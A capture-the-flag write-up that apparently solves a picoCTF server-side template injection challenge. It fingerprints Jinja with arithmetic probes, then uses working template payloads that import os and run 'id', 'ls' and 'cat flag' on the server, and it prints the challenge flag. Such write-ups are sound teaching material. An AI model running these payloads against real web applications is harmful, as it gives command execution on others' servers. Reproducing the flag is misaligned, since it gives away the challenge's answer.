# Server-Side Template Injection (SSTI)

**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}`

### Thought Process:
 *1) Testing the website for any vulnerabilities related to user input*
 One of the key aspects of SSTI related vulnerabilities is how testing the 'dynamic part' of the code template can actually end up executing a code on the main template.
 Here, we enter `{{7*7}}` as the user input. The website displays `49` as the output implying that it is indeed vulnerable to SSTI.
 Further exploration by using specific inputs like `{{7*'a'}}` (which displays 'a' printed 7 times as output) and `{{7*'7'}}` (Which displays 49 as the ouput) further helps us in determining Jinja as the template engine.

 *2) Launching the payload in the input section*
 Jinja does not allow us to directly import the os. This means that we've to work with the given system parameters and 'reach' the os (or link it to the os).
 We use the following command to emulate the id command.
`{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`
Here, `globals, builtins` all allow us to link our way to into importing the os before executing the id commands with `popen`
This invokes the output:
```
uid=0(root)
gid=0(root)
groups=0(root)
```
This output indicates that the application is running with root privileges within its environment.

*3) Further exploring the environment*
We use the following code to list the files in the current working directory.
`{{ request.application.__globals__.__builtins__.__import__('os').popen('ls').read() }}`
which invokes the output:
```
__pycache_app.pyflagrequirements.txt
```

*4) Obtaining the flag*
We invoke the following command to obtain the flag.
`{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}`


### Key Learnings:
Famliarized myself with vulnerabilities or risk of vulnerabilities related with `userinfo+code` templates. If any, these can be exploited by using Server-side Template Injections which ultimately allow us to obtain the required information from the given website.
